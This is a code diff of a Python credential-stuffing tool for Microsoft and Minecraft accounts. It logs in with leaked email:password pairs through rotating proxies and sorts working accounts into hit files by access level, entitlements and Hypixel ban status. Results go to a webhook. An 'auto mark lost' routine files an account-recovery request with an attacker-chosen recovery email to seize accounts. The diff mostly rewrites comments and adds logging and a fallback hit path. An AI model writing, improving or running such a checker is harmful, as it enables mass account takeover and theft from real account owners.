@@ -40,7 +40,7 @@ warnings.filterwarnings("ignore")
 
 
 CONNECTION_TIMEOUT = 10
-
+# i used ai to add a few comments keep that in mind. most of my comments are with lowercase i couldnt bother adding comments
 class Config:
     def __init__(self):
         self.data = {}
@@ -147,13 +147,13 @@ class ProxyManager:
             if not self.proxies:
                 return None
             
-            # Try to find a working proxy
+            #  find a working proxy
             attempts = 0
             while attempts < len(self.proxies):
                 self.last_used = (self.last_used + 1) % len(self.proxies)
                 proxy = self.proxies[self.last_used]
                 
-                # Skip failed proxies
+                # skip failing proxies
                 if proxy in self.failed_proxies:
                     attempts += 1
                     continue
@@ -177,17 +177,17 @@ class ProxyManager:
                     
                     return proxy_dict
                 except:
-                    # If proxy format is invalid, mark it as failed
+                    # if proxy format is not valido mark it as failed
                     self.failed_proxies.add(proxy)
                     attempts += 1
             
-            # If all proxies failed, reset and try again
+            # if all proxies fail it reset and try again
             if attempts >= len(self.proxies) and len(self.failed_proxies) >= len(self.proxies) * 0.9:
                 self.failed_proxies = set()
                 self.failed_count = {}
                 return self.get_proxy(proxy_type)
                 
-            # If we can't find a working proxy, return None
+            # if we can't find a working proxy return None ;)
             return None
     
     def get_ban_proxy(self):
@@ -427,21 +427,21 @@ class Capture:
                                 self.access = "False"
                                 return False
                         except json.JSONDecodeError:
-                            # JSON parsing failed, retry
+                            # json parsing
                             continue
                     elif response.status_code == 429:
-                        # Rate limited, wait and retry
+                        # rate limit
                         time.sleep(2)
                         continue
                 except Exception as e:
-                    # Network error or other exception, retry
+                    # network error or other exception retry
                     continue
                     
-            # If we reach here, all attempts failed
+            # all attempt fail :(
             self.access = "Unknown"
             return False
         except Exception as e:
-            # Catch any other exceptions
+            # exception
             self.access = "Unknown"
             return False
 
@@ -500,7 +500,7 @@ class Capture:
         if not config.get('hypixelban') or not self.token or not self.uuid:
             return
 
-        # Save the original socket before modifying it
+        # sawkets
         original_socket = socket.socket
         
         auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
@@ -509,7 +509,7 @@ class Capture:
         for attempt in range(max_retries):
             proxy = None
             try:
-                # Get a ban proxy
+                # ban proxi
                 proxy = proxy_manager.get_ban_proxy()
                 if proxy:
                     try:
@@ -526,7 +526,7 @@ class Capture:
                         print(f"Error setting up proxy: {str(e)}")
                         continue
                 
-                # Redirect stderr to capture minecraft library output
+                # minecraft library output (mlo)
                 original_stderr = sys.stderr
                 sys.stderr = StringIO()
                 
@@ -559,7 +559,7 @@ class Capture:
                     event.set()
                 
                 try:
-                    # Set up connection
+                    # connection to alphaserver so ban checking :thumbsup:
                     connection = Connection(
                         "alpha.hypixel.net", 25565, 
                         auth_token=auth_token, 
@@ -567,12 +567,12 @@ class Capture:
                         allowed_versions={"1.8", 47}
                     )
                     
-                    # Start the connection thread
+                    # thread
                     connection_thread = threading.Thread(target=connection.connect)
                     connection_thread.daemon = True
                     connection_thread.start()
                     
-                    # Wait with timeout
+                    # timeout
                     if event.wait(5):  # 5 second timeout
                         try:
                             connection.disconnect()
@@ -581,7 +581,7 @@ class Capture:
                         if self.banned is not None:
                             break
                     else:
-                        # Timeout occurred
+                        # timeout yes
                         try:
                             connection.disconnect()
                         except:
@@ -589,41 +589,41 @@ class Capture:
                 except Exception as e:
                     print(f"Error connecting to Hypixel: {str(e)}")
                 
-                # Restore stderr
+                # stderr
                 sys.stderr = original_stderr
                 
             except Exception as e:
                 print(f"Error in ban check: {str(e)}")
             finally:
-                # Always restore the socket
+                # socket restore
                 if proxy:
                     try:
                         socket.socket = original_socket
                     except:
                         pass
         
-        # If we couldn't determine ban status
+        # if no determine ban status
         if self.banned is None:
             self.banned = "Unknown"
             
-        # Make sure the socket is restored
+        # make sure the socket is restored
         socket.socket = original_socket
 
     def process_account(self, result_folder):
         try:
-            # Create directories if they don't exist
+            # create directories if they don exist
             os.makedirs(result_folder, exist_ok=True)
             
-            # Save the hit first
+            # save hit
             with open(f"{result_folder}/Hits.txt", 'a') as file: 
                 file.write(f"{self.email}:{self.password}\n")
             
-            # If the name is set, perform additional checks
+            # zf the name is set more checking boo hoo
             if self.name and self.name != 'N/A':
-                # Only start threads if the corresponding config options are enabled
+                # if settings enabled = threads = true very good explanation
                 threads = []
                 
-                # Hypixel data thread - only if at least one hypixel option is enabled
+                # hypickle check - only if at least one hypixel option is enabled
                 if (config.get('hypixelname') or config.get('hypixellevel') or 
                     config.get('hypixelfirstlogin') or config.get('hypixellastlogin') or 
                     config.get('hypixelbwstars') or config.get('hypixelsbcoins')):
@@ -632,32 +632,32 @@ class Capture:
                     threads.append(t1)
                     t1.start()
                 
-                # Optifine cape thread - only if enabled
+                # Optifine cape thread - again only if enabled
                 if config.get('optifinecape'):
                     t2 = threading.Thread(target=self.check_optifine_cape)
                     t2.daemon = True
                     threads.append(t2)
                     t2.start()
                 
-                # Name change thread - only if enabled
+                # Name change thread - again only if enabled
                 if config.get('namechange') or config.get('lastchanged'):
                     t3 = threading.Thread(target=self.check_namechange)
                     t3.daemon = True
                     threads.append(t3)
                     t3.start()
                 
-                # Ban status thread - only if enabled
+                # Ban status thread - again only if enabled
                 if config.get('hypixelban') and self.token and self.uuid:
                     t4 = threading.Thread(target=self.check_ban_status)
                     t4.daemon = True
                     threads.append(t4)
                     t4.start()
                 
-                # Wait for threads with a timeout to prevent hanging
+                # timeout no hang
                 for t in threads:
-                    t.join(timeout=10)  # 10 second timeout for each thread
+                    t.join(timeout=10)  # im too bored to comment this line
                 
-                # Check for email access
+                # sfa/mfa
                 is_mfa = self.check_full_access()
                 if is_mfa:
                     with open(f"{result_folder}/MFA.txt", 'a') as f:
@@ -666,7 +666,7 @@ class Capture:
                     with open(f"{result_folder}/SFA.txt", 'a') as f:
                         f.write(f"{self.email}:{self.password}\n")
                 
-                # Save ban status results if available
+                # ban status
                 if self.banned is not None:
                     if self.banned == "False":
                         with open(f"{result_folder}/Unbanned.txt", 'a') as f:
@@ -675,15 +675,15 @@ class Capture:
                         with open(f"{result_folder}/Banned.txt", 'a') as f:
                             f.write(f"{self.email}:{self.password}\n")
             
-            # Write capture file
+            # capture file
             with open(f"{result_folder}/Capture.txt", 'a') as f:
                 f.write(self.builder())
             
-            # Send webhook notification if configured
+            # it send webhook
             if config.get('webhook'):
                 self.notify()
             
-            # Return account data for display
+            # we return data for the results page
             return {
                 "email": self.email,
                 "password": self.password,
@@ -699,7 +699,7 @@ class Capture:
             }
         except Exception as e:
             print(f"Error processing account {self.email}: {str(e)}")
-            # Return basic account data even if processing failed
+            # basic data
             return {
                 "email": self.email,
                 "password": self.password,
@@ -716,20 +716,16 @@ class AccountChecker:
     
     def auto_mark_lost(self, email, password, recovery_email):
         try:
-            # Get authentication URL and tag
             url_post, sFTTag = self.get_authentication_url_and_tag()
             if not url_post or not sFTTag:
+                print(f"[AutoMarkLost] Failed to get authentication URL or tag for {email}")
                 return False
-                
-            # Login data
             data = {
                 'login': email, 
                 'loginfmt': email, 
                 'passwd': password, 
                 'PPFT': sFTTag
             }
-            
-            # Attempt login
             for attempt in range(3):
                 try:
                     self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
@@ -740,51 +736,48 @@ class AccountChecker:
                         allow_redirects=True, 
                         timeout=CONNECTION_TIMEOUT
                     )
-                    
-                    # Check for successful login
                     if '#' in login_request.url and login_request.url != url_post:
                         fragments = urlparse(login_request.url).fragment
                         token = parse_qs(fragments).get('access_token', ["None"])[0]
                         if token != "None":
-                            # Now mark as lost
                             mark_lost_data = {
                                 "EmailAddress": email,
                                 "Password": password,
                                 "RecoveryEmail": recovery_email,
                                 "flag": "automarklost"
                             }
-                            
                             mark_lost_response = self.session.post(
                                 "https://account.live.com/acsr",
                                 data=mark_lost_data,
                                 headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                 timeout=CONNECTION_TIMEOUT
                             )
-                            
                             if mark_lost_response.status_code == 200:
                                 os.makedirs("results", exist_ok=True)
                                 with open("results/MarkedLost.txt", "a") as f:
                                     f.write(f"{email}:{password} -> {recovery_email}\n")
+                                print(f"[AutoMarkLost] Successfully marked lost for {email}")
                                 return True
                             else:
+                                print(f"[AutoMarkLost] Mark lost failed for {email}, status: {mark_lost_response.status_code}")
                                 if attempt < 2:
                                     time.sleep(1)
                                     continue
                                 return False
-                            
                     elif login_request.status_code == 429:
+                        print(f"[AutoMarkLost] Rate limited for {email}, retrying...")
                         time.sleep(1 * (2**attempt))
                         continue
-                        
                 except Exception as e:
+                    print(f"[AutoMarkLost] Exception for {email}: {e}")
                     if attempt < 2:
                         time.sleep(1)
                         continue
                     return False
-                    
+            print(f"[AutoMarkLost] All attempts failed for {email}")
             return False
-            
         except Exception as e:
+            print(f"[AutoMarkLost] Outer exception for {email}: {e}")
             return False
 
     def get_authentication_url_and_tag(self):
@@ -833,7 +826,7 @@ class AccountChecker:
                     timeout=CONNECTION_TIMEOUT
                 )
                 
-                # Check if the response contains useful information
+                # check if the response contains goog information
                 if login_request.status_code == 200 or '#' in login_request.url:
                     # success log in
                     if '#' in login_request.url and login_request.url != url_post:
@@ -842,7 +835,7 @@ class AccountChecker:
                         if token != "None":
                             return token, "success"
                     
-                    # 2FA
+                    # twofa
                     elif any(value in login_request.text for value in [
                         "recover?mkt", 
                         "account.live.com/identity/confirm?mkt", 
@@ -892,14 +885,14 @@ class AccountChecker:
                     ]):
                         return None, "invalid"
                     
-                # Handle 429 rate limiting with exponential backoff
+                # handle 429 rate limiting with beckoff ( i needed to google this cuz me have technical dificulties)
                 elif login_request.status_code == 429:
-                    time.sleep(1 * (2**attempt))  # Exponential backoff
+                    time.sleep(1 * (2**attempt))  # exponential backoff
                     continue
                     
             except requests.exceptions.RequestException:
                 if attempt < config.get('maxretries', 3) - 1:
-                    time.sleep(1)  # Wait before retrying
+                    time.sleep(1)  # wait before retrying
                 continue
                 
         return None, "error"
@@ -990,14 +983,14 @@ class AccountChecker:
                         'capes': ', '.join([cape.get('alias', 'Unknown') for cape in profile_data.get('capes', [])])
                     }
                 elif profile_response.status_code == 404:
-                    # No profile exists (account hasn't set up a profile yet)
+                    # no profile (account hasnt set up a profile yet)
                     return None
                 elif profile_response.status_code == 429:
-                    # Rate limited, wait with exponential backoff
+                    # rate limited wait with exponential backoff
                     time.sleep(1 * (2**attempt))
                     continue
             except requests.exceptions.RequestException:
-                # Network error, retry with delay
+                # retry delay
                 time.sleep(1)
                 continue
                 
@@ -1019,13 +1012,13 @@ class AccountChecker:
                         data = entitlements.json()
                         entitlement_types = []
                         
-                        # Extract all entitlements
+                        # extract all entitlements
                         for item in data.get('items', []):
                             name = item.get('name', '')
                             if name:
                                 entitlement_types.append(name)
                         
-                        # Check for profile (Java Edition)
+                        # check for profile (java edition duh)
                         has_profile = False
                         try:
                             profile_response = self.session.get(
@@ -1040,7 +1033,7 @@ class AccountChecker:
                         except:
                             pass
                         
-                        # Determine account type
+                        # type if normal W if xgpu W and if xgp bad
                         if 'product_minecraft' in entitlement_types or has_profile:
                             account_type = "Normal"
                         elif 'product_game_pass_ultimate' in entitlement_types:
@@ -1048,7 +1041,7 @@ class AccountChecker:
                         elif 'product_game_pass_pc' in entitlement_types or 'product_game_pass' in entitlement_types:
                             account_type = "Xbox Game Pass"
                         else:
-                            # Check for other products
+                            # any other dairy products?
                             other_products = []
                             if 'product_minecraft_bedrock' in entitlement_types:
                                 other_products.append("Minecraft Bedrock")
@@ -1065,15 +1058,15 @@ class AccountChecker:
                         return account_type, entitlement_types
                     
                     elif entitlements.status_code == 429:
-                        # Rate limited, wait and retry
+                        # rate limited
                         time.sleep(1)
                         continue
                         
                 except Exception:
-                    # Network error or other exception, continue to next attempt
+                    # network error
                     continue
                     
-            # If all attempts failed
+            # if all attempt fail
             return "Unknown", []
             
         except Exception as e:
@@ -1091,7 +1084,7 @@ class AccountChecker:
                 if not email or not password:
                     return "bad", None
                 
-                # Get Microsoft token
+                # get microsoft token
                 ms_token, status = self.get_xbox_token(email, password)
                 
                 # 2FA
@@ -1100,43 +1093,43 @@ class AccountChecker:
                         file.write(f"{email}:{password}\n")
                     return "2fa", None
                 
-                # Invalid credentials
+                # invalid creds
                 if status == "invalid":
                     return "bad", None
                 
-                # If we got a token
+                # if token
                 if ms_token:
-                    # Get Xbox token
+                    # Gxbox token
                     xbox_token, uhs = self.authenticate_xbox_live(ms_token)
                     if not xbox_token or not uhs:
-                        # Valid Microsoft account but no Xbox account
+                        # valid microsoft account but no xbox account
                         with open(f"{result_folder}/Valid_Mail.txt", 'a') as file:
                             file.write(f"{email}:{password}\n")
                         return "vm", None
                 
-                    # Get XSTS token
+                    # Get xsts token
                     xsts_token = self.get_xsts_token(xbox_token)
                     if not xsts_token:
-                        # Valid Microsoft account
+                        # Valid Microsoft account (VM)
                         with open(f"{result_folder}/Valid_Mail.txt", 'a') as file:
                             file.write(f"{email}:{password}\n")
                         return "vm", None
                     
-                    # Get Minecraft token
+                    # get minecraft token
                     mc_token = self.get_minecraft_token(uhs, xsts_token)
                     if not mc_token:
-                        # Valid Microsoft account
+                        # valid microsoft account
                         with open(f"{result_folder}/Valid_Mail.txt", 'a') as file:
                             file.write(f"{email}:{password}\n")
                         return "vm", None
                     
-                    # Get Minecraft profile
+                    # minecraft profile
                     profile = self.get_minecraft_profile(mc_token)
                     
-                    # Check entitlements regardless of profile
+                    # check entitlements regardless of profile
                     account_type, entitlements = self.check_minecraft_entitlements(mc_token)
                     
-                    # Create capture instance
+                    # create capture instance
                     capture = Capture(
                         email=email,
                         password=password,
@@ -1147,13 +1140,13 @@ class AccountChecker:
                         type=account_type
                     )
                     
-                    # Process account
+                    # process account
                     account_data = capture.process_account(result_folder)
                     
-                    # Check email access for SFA/MFA determination
+                    # check email access for ssfa or mfa
                     is_mfa = capture.check_full_access()
                     
-                    # Categorize account based on type and access
+                    # categorize types
                     if 'gamepass_ultimate' in account_type.lower() or 'ultimate' in account_type.lower():
                         if is_mfa:
                             with open(f"{result_folder}/MFA.txt", 'a') as f:
@@ -1178,8 +1171,30 @@ class AccountChecker:
                             with open(f"{result_folder}/SFA.txt", 'a') as f:
                                 f.write(f"{email}:{password}\n")
                         return "hit", account_data
+                    # fallback
+                    elif (profile is None) and (('product_minecraft' in str(entitlements)) or ('normal' in account_type.lower())):
+                        minimal_account_data = {
+                            "email": email,
+                            "password": password,
+                            "name": 'N/A',
+                            "type": account_type,
+                            "capes": 'N/A',
+                            "hypixel": None,
+                            "level": None,
+                            "cape": None,
+                            "access": None,
+                            "banned": None,
+                            "namechanged": None
+                        }
+                        if is_mfa:
+                            with open(f"{result_folder}/MFA.txt", 'a') as f:
+                                f.write(f"{email}:{password}\n")
+                        else:
+                            with open(f"{result_folder}/SFA.txt", 'a') as f:
+                                f.write(f"{email}:{password}\n")
+                        print(f"[Checker] Fallback hit for {email} (profile missing, entitlements valid)")
+                        return "hit", minimal_account_data
                     else:
-                        # Not a valid result type, mark as valid mail
                         with open(f"{result_folder}/Valid_Mail.txt", 'a') as file:
                             file.write(f"{email}:{password}\n")
                         return "vm", None
@@ -1192,7 +1207,7 @@ class AccountChecker:
                 time.sleep(1)
                 
             except Exception as e:
-                # On exception, retry up to max_tries times
+                print(f"[Checker] Exception for {email if 'email' in locals() else 'unknown'}: {e}")
                 if tries >= max_tries:
                     return "error", None
                 time.sleep(1)
@@ -1292,12 +1307,11 @@ class CheckerWorker(QThread):
                 self.stats["mfa"] += 1
             else:
                 self.stats["sfa"] += 1
-                # AutoMarkLost for SFA hits
                 if config.get('automarklost') and config.get('recoveryemail'):
                     checker = AccountChecker()
                     checker.auto_mark_lost(
-                        account_data["email"],
-                        account_data["password"],
+                        account_data.get("email", ""),
+                        account_data.get("password", ""),
                         config.get("recoveryemail")
                     )
         elif result_type == "2fa":
@@ -1311,12 +1325,11 @@ class CheckerWorker(QThread):
                 self.stats["mfa"] += 1
             else:
                 self.stats["sfa"] += 1
-                # AutoMarkLost for SFA XGP
                 if config.get('automarklost') and config.get('recoveryemail'):
                     checker = AccountChecker()
                     checker.auto_mark_lost(
-                        account_data["email"],
-                        account_data["password"],
+                        account_data.get("email", ""),
+                        account_data.get("password", ""),
                         config.get("recoveryemail")
                     )
         elif result_type == "xgpu":
@@ -1326,12 +1339,11 @@ class CheckerWorker(QThread):
                 self.stats["mfa"] += 1
             else:
                 self.stats["sfa"] += 1
-                # AutoMarkLost for SFA XGPU
                 if config.get('automarklost') and config.get('recoveryemail'):
                     checker = AccountChecker()
                     checker.auto_mark_lost(
-                        account_data["email"],
-                        account_data["password"],
+                        account_data.get("email", ""),
+                        account_data.get("password", ""),
                         config.get("recoveryemail")
                     )
         elif result_type == "error":
